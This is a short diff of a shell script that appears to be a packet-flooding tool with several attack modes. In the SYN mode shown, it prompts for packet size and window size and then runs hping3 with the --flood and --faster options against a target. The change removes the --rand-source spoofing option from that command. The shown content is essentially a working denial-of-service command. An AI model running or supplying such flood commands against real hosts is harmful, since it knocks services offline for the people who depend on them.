@@ -23,7 +23,7 @@ case $MODE in
         read size
         echo "Enter window size: "
         read window
-        sudo hping3 -S -p $PORT -d $size -w $window --flood --faster --rand-source $TARGET
+        sudo hping3 -S -p $PORT -d $size -w $window --flood --faster $TARGET
         ;;
 
     "fin")
